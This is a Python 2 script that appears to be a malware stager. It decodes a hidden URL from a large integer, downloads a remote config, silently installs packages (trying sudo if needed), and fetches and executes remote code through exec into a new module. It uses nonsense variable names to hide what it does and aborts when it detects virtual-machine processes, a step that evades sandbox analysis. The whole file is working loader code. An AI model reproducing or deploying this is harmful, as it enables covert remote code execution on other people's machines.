#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import imp
import json
import struct
import urllib2


def run(*args, **kwargs):
    IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
    SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
    RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
    AccidentalAquaticCactus   = json.loads(urllib2.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
    AccidentalAquaticCactus['settings']['__f__'] = IncontinentObtuseCucumber(__file__) if '__file__' in globals() else ''
    GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
    if not len(GroovySophisticatedLemur):
        exec urllib2.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__y__'))).read() in globals()
        exec urllib2.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__x__'))).read() in globals()
    else:
        try:
            for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCactus['packages'][os.name][str(struct.calcsize('P') * 8)].items():
                if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                    try:
                        RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                    except Exception as e:
                        print 'Error:', str(e)
                    if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                        try:
                            RuthlessSpiffyTablecloth(['sudo', GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                        except Exception as e:
                            print 'Error:', str(e)
                        if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                            with file(os.path.basename(NobleRusticWalrus), 'wb') as fp:
                                GnarledAutisticEarlobe = urllib2.Request(NobleRusticWalrus)
                                GnarledAutisticEarlobe.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.17025')
                                GnarledAutisticEarlobe.add_header('Referer', 'https://www.lfd.uci.edu/~gohlke/pythonlibs/')
                                fp.write(urllib2.urlopen(GnarledAutisticEarlobe).read())                            
                            try:
                                RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
                            except Exception as e:
                                print 'Error:', str(e)
                            os.remove(os.path.basename(NobleRusticWalrus)) if os.path.isfile(os.path.basename(NobleRusticWalrus)) else None
        finally:
            try:
                RoundPluckyScallion = urllib2.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__w__'))).read()
                AmbiguousObedientQuestion = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__u__'))
                TalentedAlcoholicBeetle = os.path.splitext(os.path.basename(AmbiguousObedientQuestion))[0]
                PanoramicAbandonedCraftsman = imp.new_module(TalentedAlcoholicBeetle)
                QuarrelsomeImportedAtom = '\n\n'.join([RoundPluckyScallion, urllib2.urlopen(AmbiguousObedientQuestion).read()])
                MajesticMachoOkra = compile(QuarrelsomeImportedAtom, TalentedAlcoholicBeetle, 'exec')
                exec MajesticMachoOkra in PanoramicAbandonedCraftsman.__dict__
                return PanoramicAbandonedCraftsman.main(**AccidentalAquaticCactus['settings'])
            except Exception as e:
                print 'Error:', str(e)

def main(*args, **kwargs):
    s = 'tasklist' if os.name is 'nt' else 'ps'
    c = 0 if os.name is 'nt' else -1
    if 'checkvm' in kwargs:
        if bool([i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in (kwargs.get('procs') or ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'])]) if (bool(kwargs.get('checkvm')) if 'checkvm' in kwargs else False) else bool([]):
            print 'aborting...'
            return
    if 'config' in kwargs:
        return run(**kwargs)
    else:
        print "missing argument 'config'"
        return
    

if __name__ == '__main__':
    main(config=5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950)
